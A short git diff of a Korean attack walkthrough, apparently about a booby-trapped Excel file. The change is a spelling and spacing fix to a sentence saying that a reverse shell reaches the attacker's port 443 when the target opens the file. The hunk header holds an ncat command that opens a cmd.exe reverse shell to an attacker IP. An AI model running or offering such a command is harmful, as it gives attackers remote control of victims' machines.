@@ -56,7 +56,7 @@ shell.cmd 에 \`ncat 192.168.137.131 443 -e cmd.exe 를 저장한다. 공격자�
 
 <figure><img src="../../obsidian_resources/Pasted image 20230504185904.png" alt=""><figcaption></figcaption></figure>
 
-이제 타겟이 이 EXCEL 파일을 여는 순간 아래와 같이 공격자의 포트 443으로 리버스 쉘이 연결된 것을 알수있다!&#x20;
+이제 타겟이 EXCEL 파일을 여는 순간 아래와 같이 공격자의 포트 443으로 리버스 쉘이 연결된 것을 알 수 있다!&#x20;
 
 <figure><img src="../../obsidian_resources/화면 캡처 2023-05-02 200259.png" alt=""><figcaption></figcaption></figure>
 
